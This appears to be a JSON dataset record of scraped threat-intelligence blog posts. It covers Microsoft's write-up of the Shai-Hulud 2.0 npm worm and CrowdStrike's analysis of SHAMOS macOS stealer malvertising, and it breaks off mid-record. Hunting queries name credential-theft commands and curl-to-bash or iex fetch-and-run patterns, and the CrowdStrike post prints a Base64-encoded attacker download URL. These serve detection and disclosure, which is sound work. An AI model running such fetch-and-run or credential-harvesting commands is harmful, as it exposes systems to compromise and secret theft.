immediate visibility into compromised assets as shown below. This ensures that security teams can act quickly to freeze dependencies and rotate credentials before further propagation occurs. The next recommended step for customers is to start scanning repositories and protecting supply chains. Learn how to set up connectors . Figure 4. Recommendations resulting from agentless code scanning Turn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. Turn on attack surface reduction rules , particularly on blocking executable files from running unless they meet a prevalence, age or trusted list criterion and blocking execution of potentially obfuscated scripts . For more information on GitHub\u2019s plans on securing the npm supply chain and what npm maintainers can take today, Defender also recommends checking the Github plan for a more secure npm supply chain . Microsoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog. Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence. Tactic Observed activity Microsoft Defender coverage Execution Suspicious behavior surrounding node execution Microsoft Defender for Endpoint \u2013 Suspicious Node.js process behavior Microsoft Defender Antivirus \u2013 Trojan:JS/ShaiWorm Execution Registration of impacted containers as self-hosted GitHub runners and using them to gather credentials. Microsoft Defender for Containers \u2013 Sha1-Hulud Campaign Detected: Possible command injection to exfiltrate credentials Microsoft Defender for Endpoint \u2013 Suspicious process launched Impact Data destruction activity Microsoft Defender for Containers \u2013 Suspicious usage of shared command on hidden files detected Microsoft Security Copilot Security Copilot customers can use the standalone experience to create their own prompts or run the following prebuilt promptbooks to automate incident response or investigation tasks related to this threat: Incident investigation Microsoft User analysis Threat actor profile Threat Intelligence 360 report based on MDTI article Vulnerability impact assessment Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel. Threat intelligence reports Microsoft Defender XDR customers can use the following threat analytics reports in the Defender portal (requires license for at least one Defender XDR product) to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments. Microsoft Defender XDR threat analytics: Activity Profile: From vulnerable workflows to self-replicating malware: Technical analysis of npm supply chain security incidents Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor. Attack path analysis Attack path analysis shows paths from exposed entry points to targets. Security teams can use attack path analysis to surface cross-domain exposure risks, for example how an attacker could move from externally reachable resources to sensitive systems to escalate privileges and maintain persistence. While supply chain attacks like those used by Shai-Hulud 2.0 can originate without direct exposure, customers can leverage advanced hunting to query the Exposure Graph for these broader relationships. For example, once a virtual or physical machine is determined to be compromised, key vaults that are directly accessible using credentials obtained from the compromised system can also be identified. The relevant access paths can be extracted using queries, as detailed in the hunting section below. Any key vault found along these paths should be investigated according to the mitigation guide. Hunting queries Microsoft Defender XDR Microsoft Defender XDR customers can run the following queries to find related activity in their networks: Attempts of malicious JS execution through node DeviceProcessEvents | where FileName has \"node\" and ProcessCommandLine has_any (\"setup_bun.js\", \"bun_environment.js\") Suspicious process launched by malicious JavaScript DeviceProcessEvents | where InitiatingProcessFileName in~ (\"node\", \"node.exe\") and InitiatingProcessCommandLine endswith \".js\" | where (FileName in~ (\"bun\", \"bun.exe\") and ProcessCommandLine has \".js\") or (FileName in~ (\"cmd.exe\") and ProcessCommandLine has_any (\"where bun\", \"irm \", \"[Environment]::GetEnvironmentVariable('PATH'\", \"|iex\")) or (ProcessCommandLine in~ (\"sh\", \"dash\", \"bash\") and ProcessCommandLine has_any (\"which bun\", \".bashrc && echo $PATH\", \"https://bun.sh/install\")) | where ProcessCommandLine !contains \"bun\" and ProcessCommandLine !contains \"\\\\\" and ProcessCommandLine !contains \"--\" GitHub exfiltration DeviceProcessEvents | where FileName has_any (\"bash\",\"Runner.Listener\",\"cmd.exe\") | where ProcessCommandLine has 'SHA1HULUD' and not (ProcessCommandLine has_any('malicious','grep','egrep',\"checknpm\",\"sha1hulud-checker-ado\",\"sha1hulud-checker-ado\",\" sha1hulud-checker-github\",\"sha1hulud-checker\",\"sha1hulud-scanner\",\"go-detector\",\"SHA1HULUD_IMMEDIATE_ACTIONS.md\",\"SHA1HULUD_COMPREHENSIVE_REPORT.md\",\"reddit.com\",\"sha1hulud-scan.sh\")) Paths from compromised machines and repositories to cloud key management services let T_src2Key = ExposureGraphEdges | where EdgeLabel == 'contains' | where SourceNodeCategories has_any ('code_repository', 'virtual_machine' , 'physical_device') | where TargetNodeCategories has 'secret' | project SourceNodeId, SourceNodeLabel, SourceNodeName, keyNodeId=TargetNodeId, keyNodeLabel=TargetNodeLabel; let T_key2identity = ExposureGraphEdges | where EdgeLabel == 'can authenticate as' | where SourceNodeCategories has 'key' | where TargetNodeCategories has 'identity' | project keyNodeId=SourceNodeId, identityNodeId=TargetNodeId; ExposureGraphEdges | where EdgeLabel == 'has permissions to' | where SourceNodeCategories has 'identity' | where TargetNodeCategories has \"keys_management_service\" | join hint.strategy=shuffle kind=inner (T_key2identity) on $left.SourceNodeId==$right.identityNodeId | join hint.strategy=shuffle kind=inner (T_src2Key) on keyNodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, srcEntityId=EntityIds) on $left.SourceNodeId1==$right.NodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, identityEntityId=EntityIds) on $left.identityNodeId==$right.NodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, kmsEntityId=EntityIds) on $left.TargetNodeId==$right.NodeId | project srcLabel=SourceNodeLabel1, srcName=SourceNodeName1, srcEntityId, keyNodeLabel, identityLabel=SourceNodeLabel, identityName=SourceNodeName, identityEntityId, kmsLabel=TargetNodeLabel, kmsName=TargetNodeName, kmsEntityId | extend Path = strcat('srcLabel',' contains','keyNodeLabel',' can authenticate as', ' identityLabel', ' has permissions to', ' kmsLabel') Setup of the GitHub runner with the malicious repository and downloads of the malicious bun.sh script that facilitates this CloudProcessEvents | where (ProcessCommandLine has \"--name SHA1HULUD\" ) or (ParentProcessName == \"node\" and (ProcessName == \"bash\" or ProcessName == \"dash\" or ProcessName == \"sh\") and ProcessCommandLine has \"curl -fsSL https://bun.sh/install | bash\") | project Timestamp, AzureResourceId, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName Credential collection using TruffleHog and Azure CLI CloudProcessEvents | where (ParentProcessName == \"bun\" and ProcessName in (\"bash\",\"dash\",\"sh\") and ProcessCommandLine has_any(\"az account get-access-token\",\"azd auth token\")) or (ParentProcessName == \"bun\" and ProcessName == \"tar\" and ProcessCommandLine has_any (\"trufflehog\",\"truffler-cache\")) | project Timestamp, AzureResourceId, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName Cloud security explorer Microsoft Defender for Cloud customers can also use cloud security explorer to surface possibly compromised software packages. The following screenshot represents a query that searches for a virtual machine or repository allowing lateral movement to a key vault. View the query builder . Figure 5. Cloud security explorer query The security explorer templates library has been expanded with two additional queries that retrieve all container images with compromised software packages and all the running containers with these images. Another means for security teams to proactively identify the scope of this threat is by leveraging the Cloud Security Explorer to query the granular Software Bill of Materials (SBOM) generated by agentless scanners. This capability allows you to execute dynamic, graph-based queries across your entire multi-cloud estate\u2014including virtual machines, containers, and code repositories\u2014to pinpoint specific software components and their versions without the need for agent deployment. For the Shai-Hulud 2.0 campaign, you can use the Cloud Security Explorer to map your software inventory directly to the list of known malicious packages. By running targeted queries that search for the specific compromised package names identified in our threat intelligence, you can instantly visualize the blast radius of the attack within your environment. This enables you to locate every asset containing a malicious dependency and prioritize remediation efforts effectively. Figure 6. Cloud Security Explorer query Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with \u2018TI map\u2019) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace. Indicators of compromise Indicator Type Description First seen Last seen setup_bun.js File name Malicious script that installs the Bun runtime November 24, 2025 December 1, 2025 bun_environment.js File name Script that facilitates credential gathering and exfiltration November 24, 2025 December 1, 2025 References https://www.aikido.dev/blog/shai-hulud-strikes-again-hitting-zapier-ensdomains Learn more For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog . To get notified about new publications and to join discussions on social media, follow us on LinkedIn , X (formerly Twitter) , and Bluesky . To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast . Microsoft Defender Security Research Team See Microsoft Defender Security Research Team posts Related posts February 10 15 min read Manipulating AI memory for profit: The rise of AI Recommendation Poisoning That helpful \u201cSummarize with AI\u201d button? It might be secretly manipulating what your AI recommends. February 9 3 min read A one-prompt attack that breaks LLM safety alignment As LLMs and diffusion models power more applications, their safety alignment becomes critical. February 6 5 min read Analysis of active exploitation of SolarWinds Web Help Desk We are seeing exploitation of SolarWinds Web Help Desk via CVE\u20112025\u201140551 and CVE\u20112025\u201140536 that can lead to domain compromise; here is how to patch, hunt, and mitigate now. Get started with Microsoft Security Protect your people, data, and infrastructure with AI-powered, end-to-end security from Microsoft. Learn how Connect with us on social X YouTube LinkedIn What's new Surface Pro Surface Laptop Surface Laptop Studio 2 Copilot for organizations Copilot for personal use AI in Windows Explore Microsoft products Windows 11 apps Microsoft Store Account profile Download Center Microsoft Store support Returns Order tracking Certified Refurbished Microsoft Store Promise Flexible Payments Education Microsoft in education Devices for education Microsoft Teams for Education Microsoft 365 Education How to buy for your school Educator training and development Deals for students and parents AI for education Business Microsoft AI Microsoft Security Dynamics 365 Microsoft 365 Microsoft Power Platform Microsoft Teams Microsoft 365 Copilot Small Business Developer & IT Azure Microsoft Developer Microsoft Learn Support for AI marketplace apps Microsoft Tech Community Microsoft Marketplace Marketplace Rewards Visual Studio Company Careers About Microsoft Company news Privacy at Microsoft Investors Diversity and inclusion Accessibility Sustainability English (United States) Your Privacy Choices Opt-Out Icon Your Privacy Choices Consumer Health Privacy Sitemap Contact Microsoft Privacy Manage cookies Terms of use Trademarks Safety & eco Recycling About our ads \u00a9 Microsoft 2026",
    "expected_count": 3
  },
  {
    "url": "https://www.crowdstrike.com/en-us/blog/falcon-prevents-cookie-spider-shamos-delivery-macos/",
    "title": "Falcon Platform Prevents COOKIE SPIDER\u2019s SHAMOS Delivery on macOS | CrowdStrike",
    "content": "Falcon Platform Prevents COOKIE SPIDER\u2019s SHAMOS Delivery on macOS | CrowdStrike BLOG Featured CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication Feb 12, 2026 How to Scale SOC Automation with Falcon Fusion SOAR Feb 11, 2026 Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security Feb 10, 2026 February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched Feb 10, 2026 Recent CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication Feb 12, 2026 How to Scale SOC Automation with Falcon Fusion SOAR Feb 11, 2026 Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security Feb 10, 2026 February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched Feb 10, 2026 Video Video Highlights the 4 Key Steps to Successful Incident Response Dec 02, 2019 Helping Non-Security Stakeholders Understand ATT&CK in 10 Minutes or Less [VIDEO] Feb 21, 2019 Analyzing Targeted Intrusions Through the ATT&CK Framework Lens [VIDEO] Jan 22, 2019 Qatar\u2019s Commercial Bank Chooses CrowdStrike Falcon\u00ae: A Partnership Based on Trust [VIDEO] Aug 20, 2018 Category Agentic SOC Agentic SOC Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security 02/10/26 CrowdStrike to Acquire SGNL to Secure Every Identity in the AI Era 01/08/26 CrowdStrike\u2019s Journey in Customizing NVIDIA Nemotron Models for Peak Accuracy and Performance 01/05/26 How CrowdStrike Trains GenAI Models at Scale Using Distributed Computing 12/22/25 Cloud & Application Security Cloud & Application Security CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner Peer Insights\u2122 Voice of the Customer for Application Security Posture Management Tools 02/03/26 CrowdStrike Unveils Real-Time Cloud Detection and Response Innovations 12/01/25 New User Experience Transforms Interaction with the Falcon Platform 10/21/25 How Falcon ASPM Secures GenAI Applications and Lessons from Dogfooding 09/30/25 Threat Hunting & Intel Threat Hunting & Intel LABYRINTH CHOLLIMA Evolves into Three Adversaries 01/29/26 How CrowdStrike\u2019s Malware Analysis Agent Detects Malware at Machine Speed 01/06/26 Unveiling WARP PANDA: A New Sophisticated China-Nexus Adversary 12/04/25 CrowdStrike Research: Security Flaws in DeepSeek-Generated Code Linked to Political Triggers 11/20/25 Endpoint Security & XDR Endpoint Security & XDR Advanced Web Shell Detection and Prevention: A Deep Dive into CrowdStrike's Linux Sensor Capabilities 02/05/26 CrowdStrike Falcon Scores Perfect 100% in SE Labs\u2019 Most Challenging Ransomware Test 02/03/26 CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Voice of the Customer for Endpoint Protection Platforms 01/28/26 Small Devices, Big Risk: USB Drives Threaten Enterprise Security 01/21/26 Engineering & Tech Engineering & Tech EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware 09/03/25 Falcon Platform Prevents COOKIE SPIDER\u2019s SHAMOS Delivery on macOS 08/20/25 CrowdStrike\u2019s Approach to Better Machine Learning Evaluation Using Strategic Data Splitting 08/11/25 CrowdStrike Researchers Develop Custom XGBoost Objective to Improve ML Model Release Stability 03/20/25 Executive Viewpoint Executive Viewpoint The Architecture of Agentic Defense: Inside the Falcon Platform 01/16/26 The Dawn of the Agentic SOC: Reimagining Cybersecurity for the AI Era 09/26/25 CrowdStrike Falcon Platform Evolves to Lead the Agentic Security Era 09/16/25 CrowdStrike to Acquire Pangea to Secure Enterprise AI Use and Development 09/15/25 From The Front Lines From The Front Lines CrowdStrike Named a Leader in 2025 IDC MarketScape for Worldwide Incident Response Services 08/27/25 CrowdStrike Launches New AI Security Services to Strengthen AI Security and SOC Readiness 08/06/25 CrowdStrike Detects and Blocks Initial SharePoint Zero-Day Exploitation 07/21/25 Prescription for Protection: Healthcare Industry Observations from CrowdStrike Investigations 07/01/25 Next-Gen Identity Security Next-Gen Identity Security CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication 02/12/26 CrowdStrike to Acquire Seraphic to Secure Work in Any Browser 01/13/26 Falcon Shield Evolves with AI Agent Visibility and Falcon Next-Gen SIEM Integration 12/08/25 CrowdStrike Named Overall Leader in 2025 KuppingerCole ITDR Leadership Compass 11/10/25 Next-Gen SIEM & Log Management Next-Gen SIEM & Log Management How to Scale SOC Automation with Falcon Fusion SOAR 02/11/26 Transform AWS Security Operations with Falcon Next-Gen SIEM 12/01/25 CrowdStrike Leads New Evolution of Security Automation with Charlotte Agentic SOAR 11/05/25 CrowdStrike Named a Visionary in 2025 Gartner\u00ae Magic Quadrant\u2122 for Security Information and Event Management 10/10/25 Public Sector Public Sector CrowdStrike Achieves FedRAMP\u00ae High Authorization 03/19/25 NHS Matures Healthcare Cybersecurity with NCSC\u2019s CAF Assurance Model 03/13/25 Zero Trust Strengthens Data Protection to Achieve National Cyber Strategy Goals 01/15/25 CrowdStrike Statement on Bloomberg\u2019s October 25, 2024 Story 10/25/24 Exposure Management Exposure Management February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched 02/10/26 CrowdStrike Is the Only Vendor to Be Named a Customers\u2019 Choice in 2025 Gartner\u00ae Voice of the Customer for External Attack Surface Management 02/09/26 January 2026 Patch Tuesday: 114 CVEs Patched Including 3 Zero-Days 01/13/26 Inside the Latest Innovations Powering Falcon Exposure Management 12/12/25 Data Protection Data Protection Falcon Data Protection for Cloud Extends DSPM into Runtime 11/20/25 CrowdStrike Stops GenAI Data Leaks with Unified Data Protection 09/18/25 Q&A: How Mastronardi Produce Secures Innovation with CrowdStrike 02/14/25 Data Protection Day 2025: The Evolving Role of AI in Data Protection 01/28/25 Securing AI Securing AI What Security Teams Need to Know About OpenClaw, the AI Super Agent 02/04/26 Secure AI with CrowdStrike: Real-World Stories of Protecting AI Workloads and Data 02/02/26 How Agentic Tool Chain Attacks Threaten AI Agent Security 01/30/26 Data Protection Day 2026: From Compliance to Resilience 01/28/26 Start Free Trial Featured Recent Video Category Start Free Trial Falcon Platform Prevents COOKIE SPIDER\u2019s SHAMOS Delivery on macOS August 20, 2025 | Maddie Stewart - Suweera De Souza - Ash Leslie - Doug Brown | Engineering & Tech \u2022 Threat Hunting & Intel Between June and August 2025, the CrowdStrike Falcon\u00ae platform successfully blocked a sophisticated malware campaign that attempted to compromise over 300 customer environments. The campaign deployed SHAMOS , a variant of Atomic macOS Stealer (AMOS) developed by the cybercriminal group COOKIE SPIDER. Operating as malware-as-a-service, COOKIE SPIDER rents this information stealer to cybercriminals who deploy it to harvest sensitive information and cryptocurrency assets from victims. The campaign utilized malvertising to direct users to fraudulent macOS help websites where victims were instructed to execute a malicious one-line installation command. This campaign underscores the popularity of malicious one-line installation commands among eCrime actors. This technique allows them to bypass Gatekeeper security checks and install the Mach-O executable directly onto victim devices. Cuckoo Stealer and SHAMOS operators have previously leveraged this method in Homebrew malvertising campaigns occurring between May 2024 and January 2025. Details In an exemplar campaign from June 2025, when the victim searches for a macOS-related issue \u2014 for example, \u201cmacos flush resolver cache\u201d \u2014 they receive a promoted malvertising website in their search results (Figure 1). Users located in multiple countries \u2014 including the U.S., UK, Japan, China, Colombia, Canada, Mexico, Italy, and others \u2014 received these advertisements; no victims were located in Russia. This is likely due to the fact that Russian eCrime forums prohibit commodity malware operators from targeting users based in Russia and other countries belonging to the Commonwealth of Independent States (CIS). Figure 1. Screenshot of search engine results with promoted malvertising website One Google Advertising profile promoting this spoofed macOS help website appears to be a legitimate Australia-based electronics store, suggesting the eCrime actors responsible are likely spoofing the store name in their Google Advertising profile. This assessment is made with moderate confidence, as this profile\u2019s promoted advertisement URLs appear to relate to macOS help pages \u2014 mac-safer[.]com and rescue-mac[.]com \u2014 and therefore do not align with the legitimate store\u2019s business operations (Figure 2). Figure 2. Google advertising profile The fake help pages provide victims with false instructions for how to fix their problem (Figure 3). Figure 3. False instructions displayed on macOS help pages Both malvertising websites instruct the victims to copy, paste, and execute the following command in Terminal (Figure 4): Figure 4. Malicious one-line installation command displayed on malvertising websites The command decodes the Base64-encoded string aHR0cHM6Ly9pY2xvdWRzZXJ2ZXJzLmNvbS9nbS9pbnN0YWxsLnNo and downloads a file from https[:]//icloudservers[.]com/gm/install[.]sh . This file is a Bash script that captures the user\u2019s password and downloads a SHAMOS Mach-O executable from https[:]//icloudservers[.]com/gm/update (Figure 5). Figure 5. Bash script contents Since first reporting on this type of campaign in June 2025, CrowdStrike Counter Adverary Operations has continued to observe opportunistic eCrime threat actors leveraging malicious GitHub repositories to prompt victims to execute commands that download SHAMOS . Similar to the aforementioned activity, campaign operators allege to offer a free download of a tool designed for macOS; these tools involve video editing software, computer-aided design (CAD) products, macOS performance tools, AI software, and dictation software. The threat actor(s) behind these pages continue to use the malicious one-line command to install SHAMOS . In some cases, the command is written entirely in plain text, and in others, the URL that hosts SHAMOS is Base64-encoded (Figure 6). Figure 6. Samples of malicious one-line installation commands displayed on malvertising websites throughout July and August 2025 SHAMOS Installation/Execution The malicious installation command downloads SHAMOS Mach-O into the /tmp/ directory, removes extended file attributes using xattr likely for bypassing Gatekeeper checks, assigns executable permissions via chmod , and then executes the stealer. SHAMOS executes anti-VM commands to verify that the Mach-O is not executing in a suspected sandbox environment. The stealer then executes a variety of AppleScript commands for host reconnaissance and data collection tasks, including searching for known cryptocurrency-related wallet files and sensitive credential-based files on disk. SHAMOS attempts to exfiltrate collected sensitive files, including data from Keychain, AppleNotes, and browsers, using curl to transmit the data in a ZIP archive named out.zip (Figure 7). Figure 7. Falcon UI detection on the binary execution from tmp SHAMOS downloads additional malicious payloads, including a spoofed Ledger Live wallet application and a botnet module, to the victim\u2019s home directory as hidden files and assigns them with executable permissions. The stealer also configures a Plist file named com.finder.helper.plist for persistence and saves it to the User\u2019s LaunchDaemons directory if the victim has Sudo privileges. CrowdStrike observed multiple curl commands, likely suggesting the eCrime actor was using SHAMOS \u2019s botnet module (Figure 8). Figure 8. Falcon UI detection demonstrating likely botnet module use Additional Reporting Open-source reporting detailed an additional malvertising campaign related to the observed activity. This campaign involved a GitHub repository masquerading as iTerm2\u2019s GitHub repository, located at https[:]//github[.]com/jeryrymoore/Iterm2 , that contained instructions detailing how to download iTerm2, a terminal emulator for macOS (Figure 9). 1 The malicious one-line installation command is nearly identical to the command used in the malvertising campaign; however, the campaign\u2019s Bash script host URL is not Base64-encoded. The Bash script \u2014 retrieved from https[:]//macostutorial[.]com/iterm2/install[.]sh \u2014 downloads SHAMOS from https[:]//macostutorial[.]com/iterm2/update . Figure 9. GitHub repository containing fake iTerm2 installation instructions CrowdStrike Falcon Coverage CrowdStrike employs a layered approach for malware detection using machine learning and indicators of attack (IOAs). As shown in Figure 10, the CrowdStrike Falcon\u00ae sensor\u2019s machine learning capabilities and behavior-based detection capabilities (IOAs) can automatically detect and prevent SHAMOS in the initial stages of the attack chain (i.e., as soon as the malware is downloaded onto the victim\u2019s machine and at execution of the malicious shell script). Additionally, IOAs can recognize malicious behavior at further stages in the attack chain, including when the threat actor attempts to employ tactics like data collection, persistence, execution of further binaries, and data exfiltration. Figure 10. Falcon UI detection on execution of Bash script Assessment This campaign highlights that leveraging malvertising and the one-line installation-command technique to distribute macOS information stealers remains popular among eCrime actors. Promoting false malicious websites encourages more site traffic, which will lead to more potential victims. The one-line installation command enables eCrime actors to directly install the Mach-O executable onto the victim\u2019s machine while bypassing Gatekeeper checks. CrowdStrike Counter Adversary Operations assesses that eCrime actors will likely continue to leverage both malvertising and one-line installation commands to distribute macOS information stealers. This assessment is made with high confidence, as the combination has historically been successful, and these methods allow actors to bypass Gatekeeper checks. Recommended Prevention Settings To protect endpoints from this threat, CrowdStrike Falcon\u00ae Insight XDR customers should ensure the following prevention policy settings are configured: Suspicious process prevention Intelligence-sourced threat prevention Threat Hunting Queries The following CrowdStrike Falcon\u00ae Next-Gen SIEM Advanced Event Search queries are provided to assist defenders in hunting for this and similar activity across their endpoints. NOTE: Make sure to update the Falcon URL to the cloud in which your environment is currently configured (US1, US2, EU, etc.) \u201cBash script execution with calls to risky LOOBINs\u201d event_platform=Mac #event_simpleName=ScriptControlScanInfo ScriptContent=\"*dscl*curl*xattr*chmod*\" | format(\"[GraphExplorer](https://falcon.crowdstrike.com/graphs/process-explorer/tree?id=pid:%s:%s)\", field=[\"aid\", \"TargetProcessId\"], as=GraphExplorer) | groupBy([aid, GraphExplorer, ScriptContent]) \u201cAppleScript execution under a binary from /tmp/\u201d event_platform=Mac #event_simpleName=ProcessRollup2 ImageFileName=\"*/tmp/*\" | join({event_platform=Mac #event_simpleName=ProcessRollup2 ImageFileName=\"*osascript\" CommandLine=\"*-e*\" | rename(field=\"CommandLine\", as=\"ChildCommandLine\") | rename(field=\"ImageFileName\", as=\"ChildImageFileName\")}, field=TargetProcessId, key=ParentProcessId, include=[\"ChildImageFileName\", \"ChildCommandLine\"], limit=20000) | format(\"[GraphExplorer](https://falcon.crowdstrike.com/graphs/process-explorer/tree?id=pid:%s:%s)\", field=[\"aid\", \"TargetProcessId\"], as=GraphExplorer) | groupBy([aid, GraphExplorer, ImageFileName, CommandLine, ChildImageFileName, ChildCommandLine]) \u201cCurl with commandline indicative of data exfil\u201d event_platform=Mac #event_simpleName=ProcessRollup2 FileName=curl CommandLine=\"*POST*out.zip*\" | format(\"[GraphExplorer](https://falcon.crowdstrike.com/graphs/process-explorer/tree?id=pid:%s:%s)\", field=[\"aid\", \"TargetProcessId\"], as=GraphExplorer) | groupBy([aid, GraphExplorer, ImageFileName, CommandLine]) Indicators of Compromise (IOCs) IOC Description Malvertising websites containing instructions to download SHAMOS mac-safer[.]com rescue-mac[.]com https[:]//github[.]com/jeryrymoore/Iterm2 Bash script SHA256 hashes 231c4bf14c4145be77aa4fef36c208891d818983c520ba067dda62d3bbbf547f eb7ede285aba687661ad13f22f8555aab186debbadf2c116251cb269e913ef68 SHAMOS Mach-O SHA256 hashes 4549e2599de3011973fde61052a55e5cdb770348876abc82de14c2d99575790f b01c13969075974f555c8c88023f9abf891f72865ce07efbcee6c2d906d410d5 a4e47fd76dc8ed8e147ea81765edc32ed1e11cff27d138266e3770c7cf953322 Bash script host URLs https[:]//icloudservers[.]com/gm/install[.]sh https[:]//macostutorial[.]com/iterm2/install[.]sh SHAMOS host URLs https[:]//icloudservers[.]com/gm/update https[:]//macostutorial[.]com/iterm2/update MITRE ATT&CK Framework The following table maps reported COOKIE SPIDER and SHAMOS tactics, techniques, and procedures (TTPs) to the MITRE ATT&CK\u00ae framework. ID Technique Description T1583.001 Acquire Infrastructure: Domains The eCrime actor registered fake macOS help websites T1189 Drive-by Compromise Malvertising distributes websites containing SHAMOS installation instructions T1204 User Execution SHAMOS requires the user to execute the malicious installer command T1027.010 Obfuscated Files or Information: Command Obfuscation The malicious command uses Base64-encoding to obfuscate the Bash script download URL T1105 Ingress Tool Transfer The malicious Bash script downloads SHAMOS from an external URL Additional Resources Learn how CrowdStrike\u2019s Threat Intelligence and Hunting solutions are transforming security operations to better protect your business. Tune into the Adversary Universe Podcast , where CrowdStrike experts discuss today\u2019s threat actors \u2014 who they are, what they\u2019re after, and how you can defend against them. Download the CrowdStrike 2025 Global Threat Report and CrowdStrike 2025 Threat Hunting Report . 1. The legitimate iTerm2 GitHub repository is located at https[:]//github[.]com/gnachman/iTerm2. Tweet Share Related Content CrowdStrike\u2019s Journey in Customizing NVIDIA Nemotron Models for Peak Accuracy and Performance How CrowdStrike Trains GenAI Models at Scale Using Distributed Computing EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware Categories Agentic SOC 47 Cloud & Application Security 139 Data Protection 20 Endpoint Security & XDR 349 Engineering & Tech 86 Executive Viewpoint 177 Exposure Management 115 From The Front Lines 197 Next-Gen Identity Security 65 Next-Gen SIEM & Log Management 109 Public Sector 40 Securing AI 24 Threat Hunting & Intel 208 CONNECT WITH US FEATURED ARTICLES October 01, 2024 CrowdStrike Named a Leader in 2024 Gartner\u00ae Magic Quadrant\u2122 for Endpoint Protection Platforms September 25, 2024 Recognizing the Resilience of the CrowdStrike Community September 25, 2024 CrowdStrike Drives Cybersecurity Forward with New Innovations Spanning AI, Cloud, Next-Gen SIEM and Identity Protection September 18, 2024 SUBSCRIBE Sign up now to receive the latest notifications and updates from CrowdStrike. Sign Up See CrowdStrike Falcon \u00ae in Action Detect, prevent, and respond to attacks\u2014 even malware-free intrusions\u2014at any stage, with next-generation endpoint protection. See Demo CrowdStrike\u2019s Approach to Better Machine Learning Evaluation Using Strategic Data Splitting EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware Copyright \u00a9 2026 CrowdStrike Privacy Request Info Blog Contact Us 1.888.512.8906 Accessibility",
    "filtered_content": "Falcon Platform Prevents COOKIE SPIDER\u2019s SHAMOS Delivery on macOS | CrowdStrike BLOG Featured CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication Feb 12, 2026 How to Scale SOC Automation with Falcon Fusion SOAR Feb 11, 2026 Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security Feb 10, 2026 February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched Feb 10, 2026 Recent CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner\u00ae Peer Insights\u2122 Voice of the Customer for User Authentication Feb 12, 2026 How to Scale SOC Automation with Falcon Fusion SOAR Feb 11, 2026 Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security Feb 10, 2026 February 2026 Patch Tuesday: Six Zero-Days Among 59 CVEs Patched Feb 10, 2026 Video Video Highlights the 4 Key Steps to Successful Incident Response Dec 02, 2019 Helping Non-Security Stakeholders Understand ATT&CK in 10 Minutes or Less [VIDEO] Feb 21, 2019 Analyzing Targeted Intrusions Through the ATT&CK Framework Lens [VIDEO] Jan 22, 2019 Qatar\u2019s Commercial Bank Chooses CrowdStrike Falcon\u00ae: A Partnership Based on Trust [VIDEO] Aug 20, 2018 Category Agentic SOC Agentic SOC Inside the Human-AI Feedback Loop Powering CrowdStrike\u2019s Agentic Security 02/10/26 CrowdStrike to Acquire SGNL to Secure Every Identity in the AI Era 01/08/26 CrowdStrike\u2019s Journey in Customizing NVIDIA Nemotron Models for Peak Accuracy and Performance 01/05/26 How CrowdStrike Trains GenAI Models at Scale Using Distributed Computing 12/22/25 Cloud & Application Security Cloud & Application Security CrowdStrike Named a Customers\u2019 Choice in 2026 Gartner Peer Insights\u2122 Voice of the Customer for Application Security Posture Management Tools 02/03/26 CrowdStrike Unveils Real-Time Cloud Detection and Response Innovations 12/01/25 New User Experience Transforms Interaction with the Falcon Platform 10/21/25 How Falcon ASPM Secures GenAI Applications and Lessons from Dogfooding 09/30/25 Threat Hunting & Intel Threat Hunting & Intel LABYRINTH CHOLLIMA Evolves into Three Adversaries 01/29/26 How CrowdStrike\u2019s Malware Analysis 